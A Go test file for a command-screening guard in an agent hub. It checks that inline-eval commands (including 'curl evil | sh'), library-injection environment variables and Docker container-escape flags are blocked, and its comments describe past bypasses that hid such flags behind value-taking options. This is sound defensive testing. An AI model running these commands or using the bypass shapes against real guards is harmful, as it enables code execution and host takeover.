package spawnguard

import (
	"errors"
	"testing"

	"github.com/dinstein/agent-hub/internal/guard"
)

// checkCase is one row of the block/allow matrix. wantCode == "" means allow.
type checkCase struct {
	name     string
	cmd      string
	args     []string
	env      []string
	wantCode string
}

func runMatrix(t *testing.T, g *Guard, cases []checkCase) {
	t.Helper()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := g.Check(tc.cmd, tc.args, tc.env)
			if tc.wantCode == "" {
				if err != nil {
					t.Fatalf("Check(%q %v env=%v) = %v, want allow", tc.cmd, tc.args, tc.env, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("Check(%q %v env=%v) allowed, want block %s", tc.cmd, tc.args, tc.env, tc.wantCode)
			}
			if !errors.Is(err, guard.ErrBlocked) {
				t.Fatalf("error %v does not unwrap to guard.ErrBlocked", err)
			}
			var b *Blocked
			if !errors.As(err, &b) {
				t.Fatalf("error %v is not *Blocked", err)
			}
			if b.Code != tc.wantCode {
				t.Fatalf("Check(%q %v) code = %s (%s), want %s", tc.cmd, tc.args, b.Code, b.Reason, tc.wantCode)
			}
		})
	}
}

func TestCheckAllows(t *testing.T) {
	t.Parallel()
	g := New(Config{})
	runMatrix(t, g, []checkCase{
		{name: "npx server", cmd: "npx", args: []string{"-y", "@modelcontextprotocol/server-github"}},
		{name: "uvx server", cmd: "uvx", args: []string{"mcp-server-git", "--repository", "."}},
		{name: "python script", cmd: "python3", args: []string{"server.py", "--port", "8000"}},
		{name: "script own -c flag", cmd: "python", args: []string{"script.py", "-c", "5"}},
		{name: "node script", cmd: "node", args: []string{"server.js"}},
		{name: "shell script file", cmd: "bash", args: []string{"./run.sh", "--verbose"}},
		{name: "sh script file", cmd: "sh", args: []string{"script.sh"}},
		{name: "deno run", cmd: "deno", args: []string{"run", "--allow-net", "app.ts"}},
		{name: "perl script", cmd: "perl", args: []string{"tool.pl"}},
		{name: "eval-ish name not eval", cmd: "evaluate-model", args: []string{"--fast"}},
		{name: "docker plain run", cmd: "docker", args: []string{"run", "--rm", "nginx"}},
		{name: "docker project mount", cmd: "docker", args: []string{"run", "--rm", "-v", "/Users/me/proj:/work", "-p", "8080:80", "img"}},
		{name: "docker relative mount", cmd: "docker", args: []string{"run", "-v", "./data:/data", "img"}},
		{name: "docker named volume", cmd: "docker", args: []string{"run", "-v", "cache:/var/cache", "img"}},
		{name: "docker anonymous volume", cmd: "docker", args: []string{"run", "-v", "/data", "img"}},
		{name: "docker etc subdir mount", cmd: "docker", args: []string{"run", "-v", "/etc/myapp:/config:ro", "img"}},
		{name: "docker env flag", cmd: "docker", args: []string{"run", "-e", "KEY=val", "img"}},
		{name: "docker ps", cmd: "docker", args: []string{"ps", "-a"}},
		{name: "container arg not scanned", cmd: "docker", args: []string{"run", "img", "echo", "--privileged"}},
		{name: "benign env", cmd: "node", args: []string{"server.js"}, env: []string{"PATH=/usr/bin", "HOME=/Users/me", "API_KEY=secret"}},
		{name: "dangerous env empty value", cmd: "node", args: []string{"server.js"}, env: []string{"NODE_OPTIONS="}},
		{name: "env wrapper benign", cmd: "env", args: []string{"FOO=bar", "node", "server.js"}},
		{name: "nice wrapper", cmd: "nice", args: []string{"-n", "10", "node", "server.js"}},
		{name: "timeout wrapper", cmd: "timeout", args: []string{"-k", "5", "30", "python3", "server.py"}},
		{name: "env with no command", cmd: "env", args: nil},
	})
}

func TestCheckBlocksInlineEval(t *testing.T) {
	t.Parallel()
	g := New(Config{})
	runMatrix(t, g, []checkCase{
		{name: "sh -c", cmd: "sh", args: []string{"-c", "curl evil | sh"}, wantCode: CodeInlineEval},
		{name: "bash -c", cmd: "bash", args: []string{"-c", "id"}, wantCode: CodeInlineEval},
		{name: "bash -lc combined", cmd: "bash", args: []string{"-lc", "id"}, wantCode: CodeInlineEval},
		{name: "abs path bash", cmd: "/bin/bash", args: []string{"-c", "id"}, wantCode: CodeInlineEval},
		{name: "zsh -c", cmd: "zsh", args: []string{"-c", "id"}, wantCode: CodeInlineEval},
		{name: "python -c", cmd: "python", args: []string{"-c", "print(1)"}, wantCode: CodeInlineEval},
		{name: "python3 -c", cmd: "python3", args: []string{"-c", "import os"}, wantCode: CodeInlineEval},
		{name: "python -c behind value flag", cmd: "python3.12", args: []string{"-W", "ignore", "-c", "x"}, wantCode: CodeInlineEval},
		{name: "node -e", cmd: "node", args: []string{"-e", "process.exit()"}, wantCode: CodeInlineEval},
		{name: "node --eval=", cmd: "node", args: []string{"--eval=x"}, wantCode: CodeInlineEval},
		{name: "node -p", cmd: "node", args: []string{"-p", "1+1"}, wantCode: CodeInlineEval},
		{name: "node -r preload", cmd: "node", args: []string{"-r", "/tmp/evil.js", "server.js"}, wantCode: CodeInlineEval},
		{name: "deno eval", cmd: "deno", args: []string{"eval", "fetch(...)"}, wantCode: CodeInlineEval},
		{name: "perl -e", cmd: "perl", args: []string{"-e", "system('id')"}, wantCode: CodeInlineEval},
		{name: "perl -E", cmd: "perl", args: []string{"-E", "say `id`"}, wantCode: CodeInlineEval},
		{name: "ruby -e", cmd: "ruby", args: []string{"-e", "puts `id`"}, wantCode: CodeInlineEval},
		{name: "php -r", cmd: "php", args: []string{"-r", "system('id');"}, wantCode: CodeInlineEval},
		{name: "osascript -e", cmd: "osascript", args: []string{"-e", "do shell script \"id\""}, wantCode: CodeInlineEval},
		{name: "bare eval", cmd: "eval", args: []string{"id"}, wantCode: CodeInlineEval},
		{name: "windows bash.exe", cmd: `C:\msys\bash.EXE`, args: []string{"-c", "id"}, wantCode: CodeInlineEval},
	})
}

func TestCheckBlocksEnvSmuggling(t *testing.T) {
	t.Parallel()
	g := New(Config{})
	runMatrix(t, g, []checkCase{
		{name: "LD_PRELOAD", cmd: "node", args: []string{"server.js"}, env: []string{"LD_PRELOAD=/tmp/x.so"}, wantCode: CodeEnvSmuggling},
		{name: "DYLD prefix", cmd: "node", args: []string{"server.js"}, env: []string{"DYLD_INSERT_LIBRARIES=/tmp/x.dylib"}, wantCode: CodeEnvSmuggling},
		{name: "NODE_OPTIONS require", cmd: "node", args: []string{"server.js"}, env: []string{"NODE_OPTIONS=--require /tmp/x"}, wantCode: CodeEnvSmuggling},
		{name: "PYTHONSTARTUP", cmd: "python3", args: []string{"server.py"}, env: []string{"PYTHONSTARTUP=/tmp/x.py"}, wantCode: CodeEnvSmuggling},
		{name: "BASH_ENV", cmd: "bash", args: []string{"script.sh"}, env: []string{"BASH_ENV=/tmp/x"}, wantCode: CodeEnvSmuggling},
		{name: "env wrapper assignment", cmd: "env", args: []string{"LD_PRELOAD=/tmp/x.so", "node", "server.js"}, wantCode: CodeEnvSmuggling},
		{name: "env -S split string", cmd: "env", args: []string{"-S", "sh -c id"}, wantCode: CodeEnvSmuggling},
		{name: "env -S attached", cmd: "env", args: []string{"-Ssh -c id"}, wantCode: CodeEnvSmuggling},
	})
}

func TestCheckBlocksContainerEscape(t *testing.T) {
	t.Parallel()
	g := New(Config{})
	runMatrix(t, g, []checkCase{
		{name: "privileged", cmd: "docker", args: []string{"run", "--privileged", "img"}, wantCode: CodeContainerEscape},
		{name: "privileged after benign flags", cmd: "docker", args: []string{"run", "--name", "x", "--privileged", "img"}, wantCode: CodeContainerEscape},
		{name: "podman privileged", cmd: "podman", args: []string{"run", "--privileged", "img"}, wantCode: CodeContainerEscape},
		{name: "container subcommand", cmd: "docker", args: []string{"container", "run", "--privileged", "img"}, wantCode: CodeContainerEscape},
		{name: "root bind mount", cmd: "docker", args: []string{"run", "-v", "/:/host", "img"}, wantCode: CodeContainerEscape},
		{name: "attached shorthand mount", cmd: "docker", args: []string{"run", "-v/:/host", "img"}, wantCode: CodeContainerEscape},
		{name: "docker sock mount", cmd: "docker", args: []string{"run", "-v", "/var/run/docker.sock:/var/run/docker.sock", "img"}, wantCode: CodeContainerEscape},
		{name: "etc mount", cmd: "docker", args: []string{"run", "--volume", "/etc:/host-etc", "img"}, wantCode: CodeContainerEscape},
		{name: "proc subpath mount", cmd: "docker", args: []string{"run", "-v", "/proc/1:/p", "img"}, wantCode: CodeContainerEscape},
		{name: "mount flag bind root", cmd: "docker", args: []string{"run", "--mount", "type=bind,source=/,target=/host", "img"}, wantCode: CodeContainerEscape},
		{name: "pid host equals", cmd: "docker", args: []string{"run", "--pid=host", "img"}, wantCode: CodeContainerEscape},
		{name: "pid host separate", cmd: "docker", args: []string{"run", "--pid", "host", "img"}, wantCode: CodeContainerEscape},
		{name: "ipc host", cmd: "docker", args: []string{"run", "--ipc=host", "img"}, wantCode: CodeContainerEscape},
		{name: "cap sys_admin", cmd: "docker", args: []string{"run", "--cap-add", "SYS_ADMIN", "img"}, wantCode: CodeContainerEscape},
		{name: "cap prefixed", cmd: "docker", args: []string{"run", "--cap-add=CAP_SYS_ADMIN", "img"}, wantCode: CodeContainerEscape},
		{name: "seccomp unconfined", cmd: "docker", args: []string{"run", "--security-opt", "seccomp=unconfined", "img"}, wantCode: CodeContainerEscape},
		{name: "exec privileged", cmd: "docker", args: []string{"exec", "--privileged", "ctr", "id"}, wantCode: CodeContainerEscape},
	})
}

// TestCheckSeesPastIsolationSpawnerFlags pins the alignment with the M2
// Docker isolation spawner (docs/modules/foundation.md): its generated run line puts
// --cidfile / --pids-limit / --ulimit style flags BEFORE the -v flags, and
// a value the scanner does not know to consume would be read as the image
// operand — stopping the scan before the mounts, i.e. blinding the guard.
//
// The end-to-end version of this (real generated argv screened by a real
// Guard) lives in internal/cli, which may import both packages; this file
// cannot (guard/* is a zero-business-dependency foundation).
func TestCheckSeesPastIsolationSpawnerFlags(t *testing.T) {
	t.Parallel()
	g := New(Config{})
	spawnerPrefix := []string{
		"run", "-i", "--rm",
		"--name", "agenthub-demo-1",
		"--label", "agenthub.managed=true",
		"--cidfile", "/tmp/agenthub-cid/cid",
		"--network", "none",
		"--memory", "512m", "--cpus", "1.5",
		"--pids-limit", "128", "--ulimit", "nofile=1024:1024",
	}
	runMatrix(t, g, []checkCase{
		{
			name:     "escape mount after the spawner flag block",
			cmd:      "docker",
			args:     append(append([]string{}, spawnerPrefix...), "-v", "/:/host", "img"),
			wantCode: CodeContainerEscape,
		},
		{
			name: "the spawner's own isolated shape passes",
			cmd:  "docker",
			args: append(append([]string{}, spawnerPrefix...),
				"-v", "/home/alice/proj:/work:ro", "-e", "TOKEN", "img", "node", "server.js"),
		},
	})
}

func TestCheckWrapperUnwrapping(t *testing.T) {
	t.Parallel()
	g := New(Config{})
	runMatrix(t, g, []checkCase{
		{name: "nohup shell eval", cmd: "nohup", args: []string{"sh", "-c", "id"}, wantCode: CodeInlineEval},
		{name: "nested wrappers", cmd: "nohup", args: []string{"nice", "-n", "5", "bash", "-c", "id"}, wantCode: CodeInlineEval},
		{name: "env then eval", cmd: "env", args: []string{"FOO=1", "python", "-c", "x"}, wantCode: CodeInlineEval},
		{name: "timeout then docker escape", cmd: "timeout", args: []string{"30", "docker", "run", "--privileged", "img"}, wantCode: CodeContainerEscape},
		{name: "busybox sh -c", cmd: "busybox", args: []string{"sh", "-c", "id"}, wantCode: CodeInlineEval},
		{name: "sudo shell eval", cmd: "sudo", args: []string{"-u", "root", "sh", "-c", "id"}, wantCode: CodeInlineEval},
		{name: "wrapper to benign command", cmd: "nohup", args: []string{"node", "server.js"}},
	})
}

func TestCheckConfigLists(t *testing.T) {
	t.Parallel()
	t.Run("denylist", func(t *testing.T) {
		t.Parallel()
		g := New(Config{Denylist: []string{"rm"}})
		runMatrix(t, g, []checkCase{
			{name: "denied", cmd: "rm", args: []string{"-rf", "/tmp/x"}, wantCode: CodeDenylisted},
			{name: "denied abs path", cmd: "/bin/rm", args: []string{"x"}, wantCode: CodeDenylisted},
			{name: "denied behind wrapper", cmd: "nohup", args: []string{"rm", "x"}, wantCode: CodeDenylisted},
			{name: "others fine", cmd: "ls", args: []string{"-la"}},
		})
	})
	t.Run("allowlist bypasses shape checks only", func(t *testing.T) {
		t.Parallel()
		g := New(Config{Allowlist: []string{"bash"}})
		runMatrix(t, g, []checkCase{
			{name: "allowlisted inline eval", cmd: "bash", args: []string{"-c", "id"}},
			{name: "non-listed still blocked", cmd: "sh", args: []string{"-c", "id"}, wantCode: CodeInlineEval},
			// Env is checked before the allowlist: dangerous env subverts
			// the trusted binary itself.
			{name: "allowlist not an env bypass", cmd: "bash", args: []string{"script.sh"}, env: []string{"LD_PRELOAD=/x"}, wantCode: CodeEnvSmuggling},
		})
	})
	t.Run("env allow and extra", func(t *testing.T) {
		t.Parallel()
		g := New(Config{AllowEnv: []string{"NODE_OPTIONS"}, ExtraDangerousEnv: []string{"MY_HOOK"}})
		runMatrix(t, g, []checkCase{
			{name: "allowed env passes", cmd: "node", args: []string{"s.js"}, env: []string{"NODE_OPTIONS=--max-old-space-size=4096"}},
			{name: "extra dangerous blocks", cmd: "node", args: []string{"s.js"}, env: []string{"MY_HOOK=/x"}, wantCode: CodeEnvSmuggling},
			{name: "defaults still apply", cmd: "node", args: []string{"s.js"}, env: []string{"LD_PRELOAD=/x"}, wantCode: CodeEnvSmuggling},
		})
	})
}

func TestBlockedError(t *testing.T) {
	t.Parallel()
	err := New(Config{}).Check("sh", []string{"-c", "id"}, nil)
	if err == nil {
		t.Fatal("want block")
	}
	if !errors.Is(err, guard.ErrBlocked) {
		t.Fatalf("%v does not satisfy errors.Is(err, guard.ErrBlocked)", err)
	}
	var b *Blocked
	if !errors.As(err, &b) || b.Code != CodeInlineEval || b.Reason == "" {
		t.Fatalf("unexpected typed error: %#v", err)
	}
	if got := err.Error(); got == "" {
		t.Fatal("empty Error()")
	}
}

// TestInlineEvalNotHiddenBehindAValueFlag is a regression for a real bypass of
// this guard.
//
// The scan stops at the first argument that does not look like a flag, on the
// theory that it is the script path and everything after belongs to the
// script. A flag's VALUE also does not look like a flag. So any interpreter
// option taking a separate value ended the scan at that value, and the eval
// flag sitting after it was never examined:
//
//	bash --rcfile /tmp/x -c 'evil'      was ALLOWED
//	node --title foo -e 'evil'          was ALLOWED
//	perl -I /tmp -e 'evil'              was ALLOWED
//
// Every one of these is the plain `sh -c` vector with one inert flag in front,
// which makes the guard trivially steppable by anyone who knows the shape.
func TestInlineEvalNotHiddenBehindAValueFlag(t *testing.T) {
	g := New(Config{})
	cases := []struct {
		name string
		cmd  string
		args []string
	}{
		{"bash --rcfile then -c", "bash", []string{"--rcfile", "/tmp/x", "-c", "id"}},
		{"bash --init-file then -c", "bash", []string{"--init-file", "/tmp/x", "-c", "id"}},
		{"sh -o then -c", "sh", []string{"-o", "errexit", "-c", "id"}},
		{"node --title then -e", "node", []string{"--title", "svc", "-e", "code"}},
		{"node --icu-data-dir then -e", "node", []string{"--icu-data-dir", "/tmp", "-e", "code"}},
		{"node --env-file then --eval", "node", []string{"--env-file", "/tmp/.env", "--eval", "code"}},
		{"perl -I then -e", "perl", []string{"-I", "/tmp", "-e", "code"}},
		{"ruby -I then -e", "ruby", []string{"-I", "/tmp", "-e", "code"}},
		{"ruby -r then -e", "ruby", []string{"-r", "json", "-e", "code"}},
		{"php -d then -r", "php", []string{"-d", "memory_limit=1G", "-r", "code"}},
		{"php -c then -r", "php", []string{"-c", "/etc/php.ini", "-r", "code"}},
		{"python -X then -c", "python3", []string{"-X", "utf8", "-c", "code"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := g.Check(tc.cmd, tc.args, nil)
			if err == nil {
				t.Fatalf("%s %v was allowed: an eval flag behind a value flag is the same vector",
					tc.cmd, tc.args)
			}
			var b *Blocked
			if !errors.As(err, &b) || b.Code != CodeInlineEval {
				t.Fatalf("blocked with %v, want %s", err, CodeInlineEval)
			}
		})
	}
}

// TestInlineEvalStillStopsAtTheScript pins the fail-open edge the fix must NOT
// have widened: once the script path is reached, its own flags belong to it.
// A guard that blocked those would refuse ordinary server definitions, and the
// operator would have no way to express "this -c is my program's".
//
// node --experimental-loader is included from the other direction: it loads an
// arbitrary module before the script, so it belongs with --require rather than
// among the harmless options.
func TestInlineEvalStillStopsAtTheScript(t *testing.T) {
	g := New(Config{})
	allowed := []struct {
		name string
		cmd  string
		args []string
	}{
		{"script's own -c", "sh", []string{"/opt/run.sh", "-c", "config.yaml"}},
		{"script's own -e after --", "node", []string{"--", "app.js", "-e", "env"}},
		{"node module run", "node", []string{"server.js", "--port", "8080"}},
		{"python -m module", "python3", []string{"-m", "mcp_server", "-c", "cfg.toml"}},
		{"ruby script then -e", "ruby", []string{"app.rb", "-e", "prod"}},
	}
	for _, tc := range allowed {
		t.Run(tc.name, func(t *testing.T) {
			if err := g.Check(tc.cmd, tc.args, nil); err != nil {
				t.Fatalf("%s %v was blocked: %v", tc.cmd, tc.args, err)
			}
		})
	}

	if err := g.Check("node", []string{"--experimental-loader", "./evil.mjs", "app.js"}, nil); err == nil {
		t.Error("--experimental-loader runs an arbitrary module before the script and must be blocked")
	}
}

// TestContainerEscapeNotHiddenBehindAValueFlag is the container half of the
// same regression as TestInlineEvalNotHiddenBehindAValueFlag, and the more
// serious one: what it lets through is a host filesystem mount.
//
// The scan stops at the first argument that is not a flag, taking it for the
// image. A flag's value is not a flag either, so any run flag missing from the
// value table ended the scan at its value and every policy-bearing flag after
// it went unjudged. docker has on the order of a hundred run flags, so the
// list could never be complete:
//
//	docker run --sysctl net.ipv4.ip_forward=1 -v /:/host img   was ALLOWED
//	docker run --storage-opt size=1G --privileged img          was ALLOWED
//
// None of these flags are exotic; they are ordinary tuning options that a
// hand-written or pasted server definition could carry for entirely innocent
// reasons, with the escape appended.
func TestContainerEscapeNotHiddenBehindAValueFlag(t *testing.T) {
	g := New(Config{})
	cases := []struct {
		name string
		args []string
	}{
		{"--sysctl then root mount", []string{"run", "--sysctl", "net.ipv4.ip_forward=1", "-v", "/:/host", "img"}},
		{"--storage-opt then privileged", []string{"run", "--storage-opt", "size=1G", "--privileged", "img"}},
		{"--health-cmd then root mount", []string{"run", "--health-cmd", "true", "-v", "/:/host", "img"}},
		{"--blkio-weight then privileged", []string{"run", "--blkio-weight", "500", "--privileged", "img"}},
		{"--cpuset-cpus then etc mount", []string{"run", "--cpuset-cpus", "0-3", "-v", "/etc:/etc", "img"}},
		{"--group-add then privileged", []string{"run", "--group-add", "docker", "--privileged", "img"}},
		{"--annotation then root mount", []string{"run", "--annotation", "a=b", "-v", "/:/host", "img"}},
		{"unknown flag then docker socket", []string{"run", "--some-future-flag", "v", "-v", "/var/run/docker.sock:/s", "img"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := g.Check("docker", tc.args, nil)
			if err == nil {
				t.Fatalf("docker %v was allowed", tc.args)
			}
			var b *Blocked
			if !errors.As(err, &b) || b.Code != CodeContainerEscape {
				t.Fatalf("blocked with %v, want %s", err, CodeContainerEscape)
			}
		})
	}
}

// TestContainerScanStillAllowsOrdinaryRuns pins that treating unknown flags as
// value-taking did not turn into blocking everything. A run with no policy
// violation must stay allowed however its flags are spelled — including the
// boolean flags, whose values must NOT be swallowed, and a container command
// after the image.
func TestContainerScanStillAllowsOrdinaryRuns(t *testing.T) {
	g := New(Config{})
	allowed := []struct {
		name string
		args []string
	}{
		{"booleans then image", []string{"run", "--rm", "-i", "img"}},
		{"named with a safe mount", []string{"run", "--name", "svc", "-v", "/data:/data:ro", "img"}},
		{"container command after the image", []string{"run", "--rm", "img", "mytool", "--flag", "x"}},
		{"unknown flag, nothing dangerous", []string{"run", "--some-future-flag", "v", "img"}},
		{"detached read-only", []string{"run", "-d", "--read-only", "--init", "img"}},
	}
	for _, tc := range allowed {
		t.Run(tc.name, func(t *testing.T) {
			if err := g.Check("docker", tc.args, nil); err != nil {
				t.Fatalf("docker %v was blocked: %v", tc.args, err)
			}
		})
	}
}

// TestWrapperFlagCannotDisplaceTheCommand is the third instance of the same
// regression as the inline-eval and container ones, in the layer that decides
// WHICH command the other checks run against.
//
// unwrap walks a wrapper's flags to find the command it runs. A flag missing
// from its table was treated as standing alone, so the flag's value became the
// "command" and the real one was never checked:
//
//	sudo --prompt x sh -c 'evil'    was ALLOWED
//	timeout -d x 10 sh -c 'evil'    was ALLOWED
//	stdbuf --input L sh -c 'evil'   was ALLOWED
//
// Unlike `docker run`, these are coreutils and sudo: closed, documented option
// sets. So the tables can be complete and an unrecognized flag is refused
// rather than guessed — guessing wrong in EITHER direction moves the command
// position, so there is no safe default to pick.
func TestWrapperFlagCannotDisplaceTheCommand(t *testing.T) {
	g := New(Config{})
	for _, tc := range []struct {
		name string
		cmd  string
		args []string
	}{
		{"sudo long-form value flag", "sudo", []string{"--prompt", "x", "sh", "-c", "id"}},
		{"sudo chroot", "sudo", []string{"-R", "/tmp", "sh", "-c", "id"}},
		{"timeout unknown flag", "timeout", []string{"-d", "x", "10", "sh", "-c", "id"}},
		{"nice unknown long form", "nice", []string{"--niceness", "5", "sh", "-c", "id"}},
		{"stdbuf long form", "stdbuf", []string{"--input", "L", "sh", "-c", "id"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := g.Check(tc.cmd, tc.args, nil); err == nil {
				t.Fatalf("%s %v was allowed", tc.cmd, tc.args)
			}
		})
	}
}

// TestWrapperStillResolvesOrdinaryCommands pins that refusing to guess did not
// turn into refusing to work: every wrapper shape a real server definition
// uses must still resolve to its command and pass.
func TestWrapperStillResolvesOrdinaryCommands(t *testing.T) {
	g := New(Config{})
	for _, tc := range []struct {
		name string
		cmd  string
		args []string
	}{
		{"timeout with a boolean flag", "timeout", []string{"--preserve-status", "10", "node", "server.js"}},
		{"nice with its value flag", "nice", []string{"-n", "5", "node", "server.js"}},
		{"stdbuf short form", "stdbuf", []string{"-o", "L", "node", "server.js"}},
		{"sudo boolean then value flag", "sudo", []string{"-n", "-u", "svc", "node", "server.js"}},
		{"bare nohup", "nohup", []string{"node", "server.js"}},
		{"setsid fork", "setsid", []string{"-f", "node", "server.js"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := g.Check(tc.cmd, tc.args, nil); err != nil {
				t.Fatalf("%s %v was blocked: %v", tc.cmd, tc.args, err)
			}
		})
	}

	// The wrapper must still find a dangerous command it CAN parse.
	if err := g.Check("timeout", []string{"10", "sh", "-c", "id"}, nil); err == nil {
		t.Error("timeout 10 sh -c was allowed")
	}
}

// TestGlobalAndEnvFlagsCannotDisplaceWhatIsChecked closes the last two places
// the "a flag's value does not look like a flag" shape reached.
//
// Both move the position of the thing being checked rather than skipping a
// check, which is why both refuse an unknown flag instead of guessing:
//
//   - a docker GLOBAL flag's value read as the subcommand makes it something
//     other than run/create/exec, and the container check is skipped whole;
//   - an env flag's value read as the command means the real command — the
//     `sh -c` right after it — is never examined.
func TestGlobalAndEnvFlagsCannotDisplaceWhatIsChecked(t *testing.T) {
	g := New(Config{})
	blocked := []struct {
		name string
		cmd  string
		args []string
	}{
		{"docker global tls flag then root mount", "docker",
			[]string{"--tlscacert", "/tmp/ca", "run", "-v", "/:/host", "img"}},
		{"docker global tls cert then privileged", "docker",
			[]string{"--tlscert", "/tmp/c", "run", "--privileged", "img"}},
		{"docker unknown global flag", "docker",
			[]string{"--some-future-global", "v", "run", "--privileged", "img"}},
		{"env argv0 then sh -c", "env", []string{"--argv0", "foo", "sh", "-c", "id"}},
		{"env unknown flag", "env", []string{"--some-future-flag", "v", "sh", "-c", "id"}},
	}
	for _, tc := range blocked {
		t.Run(tc.name, func(t *testing.T) {
			if err := g.Check(tc.cmd, tc.args, nil); err == nil {
				t.Fatalf("%s %v was allowed", tc.cmd, tc.args)
			}
		})
	}

	allowed := []struct {
		name string
		cmd  string
		args []string
	}{
		{"env assignment", "env", []string{"FOO=bar", "node", "server.js"}},
		{"env -i", "env", []string{"-i", "node", "server.js"}},
		{"env -u with a value", "env", []string{"-u", "PATH", "node", "server.js"}},
		// Bare --block-signal takes no value (GNU requires "=" for the
		// optional form), so the next argument really is the command.
		{"env bare signal option", "env", []string{"--block-signal", "node", "server.js"}},
		{"docker host then run", "docker", []string{"-H", "unix:///v.sock", "run", "--rm", "img"}},
		{"docker boolean global", "docker", []string{"--debug", "run", "--rm", "img"}},
		{"docker tlsverify", "docker", []string{"--tlsverify", "run", "--rm", "img"}},
	}
	for _, tc := range allowed {
		t.Run(tc.name, func(t *testing.T) {
			if err := g.Check(tc.cmd, tc.args, nil); err != nil {
				t.Fatalf("%s %v was blocked: %v", tc.cmd, tc.args, err)
			}
		})
	}
}
